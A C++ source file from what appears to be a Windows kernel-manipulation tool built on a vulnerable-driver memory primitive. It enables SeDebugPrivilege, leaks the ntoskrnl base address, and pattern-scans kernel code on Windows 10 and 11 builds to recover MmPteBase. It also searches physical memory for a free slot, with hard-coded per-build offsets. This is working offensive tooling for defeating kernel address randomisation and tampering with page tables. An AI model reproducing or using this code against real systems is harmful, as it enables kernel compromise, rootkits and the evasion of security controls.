#include "kernel.hpp"

#include <winternl.h>

#include <algorithm>
#include <cstring>
#include <vector>

#pragma comment(lib, "ntdll")

#define NT_SUCCESS_STATUS(status) (static_cast<NTSTATUS>(status) >= 0)

namespace
{
    const version_info k_versions [ ] = {
        {19041, 0x2F0, 0x440, 0x448, 0x4B8}, {19044, 0x2F0, 0x440, 0x448, 0x4B8}, {19045, 0x2F0, 0x440, 0x448, 0x4B8},
        {22000, 0x2F0, 0x440, 0x448, 0x4B8}, {22621, 0x2F0, 0x440, 0x448, 0x4B8}, {26100, 0x2F0, 0x1D0, 0x1D8, 0x248},
        {26200, 0x2F0, 0x1D0, 0x1D8, 0x248},
    }; // I am so fucking sorry for this. Blame 5.6 Cyber

    struct system_module_entry64
    {
        uint64_t section;
        uint64_t mapped_base;
        uint64_t image_base;
        uint32_t image_size;
        uint32_t flags;
        uint16_t load_order_index;
        uint16_t init_order_index;
        uint16_t load_count;
        uint16_t offset_to_file_name;
        char full_path_name [ 256 ];
    };

    static_assert( sizeof( system_module_entry64 ) == 0x128 , "unexpected SystemModuleInformation entry layout" );

    bool is_plausible_kernel_image( uint64_t base , uint32_t size )
    {
        return is_kernel_address( base ) && ( base & 0xFFF ) == 0 && size >= 0x100000 && size <= 0x10000000;
    }

    bool enable_debug_privilege( )
    {
        HANDLE token = nullptr;
        if ( !OpenProcessToken( GetCurrentProcess( ) , TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &token ) )
        {
            LOG( "[-] OpenProcessToken failed: %lu\n" , GetLastError( ) );
            return false;
        }

        LUID luid {};
        if ( !LookupPrivilegeValueW( nullptr , SE_DEBUG_NAME , &luid ) )
        {
            LOG( "[-] LookupPrivilegeValue(SeDebugPrivilege) failed: %lu\n" , GetLastError( ) );
            CloseHandle( token );
            return false;
        }

        TOKEN_PRIVILEGES privileges {};
        privileges.PrivilegeCount = 1;
        privileges.Privileges [ 0 ].Luid = luid;
        privileges.Privileges [ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

        SetLastError( ERROR_SUCCESS );
        BOOL adjusted = AdjustTokenPrivileges( token , FALSE , &privileges , sizeof( privileges ) , nullptr , nullptr );
        DWORD error = GetLastError( );
        CloseHandle( token );

        if ( !adjusted || error != ERROR_SUCCESS )
        {
            LOG( "[-] cannot enable SeDebugPrivilege: %lu%s\n" , error ,
                error == ERROR_NOT_ALL_ASSIGNED ? " (run from an elevated terminal)" : "" );
            return false;
        }

        LOG( "[+] SeDebugPrivilege enabled\n" );
        return true;
    }

    bool read_kernel_bytes( vdm::memory& memory , uint64_t address , uint8_t* output , size_t length )
    {
        for ( size_t i = 0; i < length; ++i )
        {
            if ( !memory.read_virt<uint8_t>( address + i , output + i ) )
                return false;
        }
        return true;
    }

    uint64_t pattern_scan( vdm::memory& memory , uint64_t start , size_t range , const uint8_t* pattern , const uint8_t* mask ,
        size_t pattern_length )
    {
        for ( size_t i = 0; i < range; ++i )
        {
            bool hit = true;
            for ( size_t j = 0; j < pattern_length; ++j )
            {
                uint8_t byte = 0;
                if ( !memory.read_virt<uint8_t>( start + i + j , &byte ) )
                {
                    hit = false;
                    break;
                }
                if ( mask [ j ] != '?' && byte != pattern [ j ] )
                {
                    hit = false;
                    break;
                }
            }
            if ( hit )
                return start + i;
        }
        return 0;
    }

    uint64_t resolve_pte_base_w11( vdm::memory& memory , uint64_t nt_base )
    {
        uint64_t mm_get_physical_address = resolve_kernel_export( nt_base , "MmGetPhysicalAddress" );
        if ( !mm_get_physical_address )
        {
            LOG( "[-] MmGetPhysicalAddress missing\n" );
            return 0;
        }
        LOG( "[*] MmGetPhysicalAddress = 0x%llX\n" , static_cast< unsigned long long >( mm_get_physical_address ) );

        static const uint8_t direct [ ] = { 0x49, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0, 0x49, 0xC1, 0xEA, 0x09 };
        static const uint8_t direct_mask [ ] = { 0, 0, '?', '?', '?', '?', '?', '?', '?', '?', 0, 0, 0, 0 };

        uint64_t direct_hit = pattern_scan( memory , mm_get_physical_address , 0x80 , direct , direct_mask , sizeof( direct ) );
        if ( direct_hit )
        {
            uint64_t pte_base = 0;
            if ( !read_kernel_bytes( memory , direct_hit + 2 , reinterpret_cast< uint8_t* >( &pte_base ) , sizeof( pte_base ) ) )
            {
                return 0;
            }
            if ( is_kernel_address( pte_base ) && ( pte_base & 0xFFF ) == 0 )
            {
                LOG( "[+] MmPteBase (direct pattern) = 0x%llX\n" , static_cast< unsigned long long >( pte_base ) );
                return pte_base;
            }
        }

        static const uint8_t pattern1 [ ] = { 0xE8, 0, 0, 0, 0, 0xF7, 0xD8 };
        static const uint8_t mask1 [ ] = { 0, '?', '?', '?', '?', 0, 0 };
        uint64_t hit1 = pattern_scan( memory , mm_get_physical_address , 0x200 , pattern1 , mask1 , sizeof( pattern1 ) );
        if ( !hit1 )
        {
            LOG( "[-] pattern 1 miss\n" );
            return 0;
        }

        int32_t relative = 0;
        if ( !read_kernel_bytes( memory , hit1 + 1 , reinterpret_cast< uint8_t* >( &relative ) , sizeof( relative ) ) )
            return 0;
        uint64_t mi_get_physical_address = hit1 + 5 + relative;

        static const uint8_t pattern2 [ ] = { 0xE8, 0, 0, 0, 0, 0x48, 0x8B, 0xCE };
        static const uint8_t mask2 [ ] = { 0, '?', '?', '?', '?', 0, 0, 0 };
        uint64_t hit2 = pattern_scan( memory , mi_get_physical_address , 0x200 , pattern2 , mask2 , sizeof( pattern2 ) );
        if ( !hit2 )
        {
            LOG( "[-] pattern 2 miss\n" );
            return 0;
        }

        if ( !read_kernel_bytes( memory , hit2 + 1 , reinterpret_cast< uint8_t* >( &relative ) , sizeof( relative ) ) )
            return 0;
        uint64_t mi_fill_pte_hierarchy = hit2 + 5 + relative;

        static const uint8_t pattern3 [ ] = { 0x49, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0x49, 0x8B, 0xC0 };
        static const uint8_t mask3 [ ] = { 0, 0, '?', '?', '?', '?', '?', '?', '?', '?', 0, 0, 0 };
        uint64_t hit3 = pattern_scan( memory , mi_fill_pte_hierarchy , 0x200 , pattern3 , mask3 , sizeof( pattern3 ) );
        if ( !hit3 )
        {
            LOG( "[-] pattern 3 miss\n" );
            return 0;
        }

        uint64_t pte_base = 0;
        if ( !read_kernel_bytes( memory , hit3 + 2 , reinterpret_cast< uint8_t* >( &pte_base ) , sizeof( pte_base ) ) )
            return 0;
        return pte_base;
    }

    uint64_t resolve_pte_base_w10( vdm::memory& memory , uint64_t nt_base )
    {
        uint64_t ke_bug_check_ex = resolve_kernel_export( nt_base , "KeBugCheckEx" );
        if ( !ke_bug_check_ex )
            return 0;

        static const uint8_t pattern1 [ ] = { 0xE8, 0, 0, 0, 0, 0x90, 0xC3 };
        static const uint8_t mask1 [ ] = { 0, '?', '?', '?', '?', 0, 0 };
        uint64_t hit1 = pattern_scan( memory , ke_bug_check_ex , 0x300 , pattern1 , mask1 , sizeof( pattern1 ) );
        if ( !hit1 )
            return 0;

        int32_t relative = 0;
        if ( !read_kernel_bytes( memory , hit1 + 1 , reinterpret_cast< uint8_t* >( &relative ) , sizeof( relative ) ) )
            return 0;
        uint64_t ke_bug_check_2 = hit1 + 5 + relative + 0xB00;

        static const uint8_t pattern2 [ ] = { 0xE8, 0, 0, 0, 0, 0x48, 0x83, 0x3D };
        static const uint8_t mask2 [ ] = { 0, '?', '?', '?', '?', 0, 0, 0 };
        uint64_t hit2 = pattern_scan( memory , ke_bug_check_2 , 0x1100 , pattern2 , mask2 , sizeof( pattern2 ) );
        if ( !hit2 )
            return 0;

        if ( !read_kernel_bytes( memory , hit2 + 1 , reinterpret_cast< uint8_t* >( &relative ) , sizeof( relative ) ) )
            return 0;
        uint64_t ki_mark_bug_check_regions = hit2 + 5 + relative;

        static const uint8_t pattern3 [ ] = { 0x48, 0x8B, 0x05, 0, 0, 0, 0, 0x48, 0xC1 };
        static const uint8_t mask3 [ ] = { 0, 0, 0, '?', '?', '?', '?', 0, 0 };
        uint64_t hit3 = pattern_scan( memory , ki_mark_bug_check_regions , 0x1100 , pattern3 , mask3 , sizeof( pattern3 ) );
        if ( !hit3 )
            return 0;

        if ( !read_kernel_bytes( memory , hit3 + 3 , reinterpret_cast< uint8_t* >( &relative ) , sizeof( relative ) ) )
            return 0;
        uint64_t variable_address = hit3 + 7 + relative;

        uint64_t pte_base = 0;
        if ( !read_kernel_bytes( memory , variable_address , reinterpret_cast< uint8_t* >( &pte_base ) , sizeof( pte_base ) ) )
            return 0;
        return pte_base;
    }
} // namespace

version_info pick_version( uint32_t build )
{
    for ( const auto& version : k_versions )
    {
        if ( version.build == build ) return version;
    }
    return k_versions [ sizeof( k_versions ) / sizeof( k_versions [ 0 ] ) - 1 ];
}

uint32_t get_windows_build( )
{
    using rtl_get_version_t = LONG( WINAPI* )( PRTL_OSVERSIONINFOW );
    auto function = reinterpret_cast< rtl_get_version_t >( GetProcAddress( GetModuleHandleW( L"ntdll.dll" ) , "RtlGetVersion" ) );
    // prob better ways todo this
    RTL_OSVERSIONINFOW version {};
    version.dwOSVersionInfoSize = sizeof( version );
    if ( function ) function( &version );
    return version.dwBuildNumber;
}

uint64_t ntos_base_from_system_info( )
{
    using nt_query_system_information_t = NTSTATUS( NTAPI* )( SYSTEM_INFORMATION_CLASS , PVOID , ULONG , PULONG );

    // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
    bool has_debug_privilege = enable_debug_privilege( ); // 24h2+ needs this to get the ntos base address.
    /*
    Starting in Windows 11 Version 24H2, EnumDeviceDrivers will require SeDebugPrivilege to return valid ImageBase values.
    The function will still succeed if the caller does not have this privilege enabled, but the returned lpImageBase array will contain addresses that are all NULL.
    */
    auto function = reinterpret_cast< nt_query_system_information_t >( GetProcAddress( GetModuleHandleW( L"ntdll.dll" ) , "NtQuerySystemInformation" ) );
    if ( !function ) return 0;

    ULONG dummy = 0;
    ULONG needed = 0;
    NTSTATUS status = function( static_cast< SYSTEM_INFORMATION_CLASS >( 11 ) , &dummy , 0 , &needed );
    LOG( "[*] SystemModuleInformation sizing: status=0x%08X needed=%lu\n" , status , needed );

    ULONG allocation_size = needed && needed < 0x800000 ? needed : 0x400000;
    std::vector<uint8_t> buffer( allocation_size + 0x1000 );
    ULONG returned = 0;
    status = function( static_cast< SYSTEM_INFORMATION_CLASS >( 11 ) , buffer.data( ) , static_cast< ULONG >( buffer.size( ) ) , &returned );
    LOG( "[*] SystemModuleInformation query: status=0x%08X got=%lu\n" , status , returned );
    if ( !NT_SUCCESS_STATUS( status ) ) return 0;

    constexpr size_t header_size = 8;
    size_t valid_bytes = returned ? ( std::min ) ( static_cast< size_t >( returned ) , buffer.size( ) ) : buffer.size( );
    if ( valid_bytes < header_size + sizeof( system_module_entry64 ) ) return 0;

    uint32_t count = 0;
    memcpy( &count , buffer.data( ) , sizeof( count ) );
    size_t available = ( valid_bytes - header_size ) / sizeof( system_module_entry64 );
    if ( count == 0 || count > available ) return 0;

    system_module_entry64 first {};
    memcpy( &first , buffer.data( ) + header_size , sizeof( first ) );
    if ( !is_plausible_kernel_image( first.image_base , first.image_size ) )
    {
        LOG( "[-] untrusted kernel module record: base=0x%llX size=0x%X\n" , static_cast< unsigned long long >( first.image_base ) , first.image_size );
        if ( !has_debug_privilege && first.image_base == 0 ) {
            LOG( "[-] Windows redacted kernel addresses; use an elevated terminal\n" );
        }
        return 0;
    }

    LOG( "[+] kernel module: base=0x%llX size=0x%X path=%.*s\n" , static_cast< unsigned long long >( first.image_base ) ,
        first.image_size , static_cast< int >( sizeof( first.full_path_name ) ) , first.full_path_name );

    return first.image_base;
}

uint64_t resolve_kernel_export( uint64_t nt_base , const char* export_name )
{
    HMODULE image = LoadLibraryExW( L"ntoskrnl.exe" , nullptr , DONT_RESOLVE_DLL_REFERENCES );
    if ( !image ) return 0;

    FARPROC exported = GetProcAddress( image , export_name );
    uint64_t address = exported ? reinterpret_cast< uint64_t >( exported ) - reinterpret_cast< uint64_t >( image ) + nt_base : 0;
    FreeLibrary( image );
    return address;
}

uint64_t resolve_pte_base_by_pattern( vdm::memory& memory , uint64_t nt_base , uint32_t build )
{
    return build >= 22000 ? resolve_pte_base_w11( memory , nt_base ) : resolve_pte_base_w10( memory , nt_base );
}

uint64_t find_swap_slot( vdm::memory& memory )
{
    for ( uint64_t physical = 0x1000; physical < 0x10000; physical += 8 ) {
        uint64_t value = 0;
        if ( !memory.read_phys<uint64_t>( physical , &value ) ) return 0;
        if ( value == 0 ) return physical;
    }
    return 0;
}
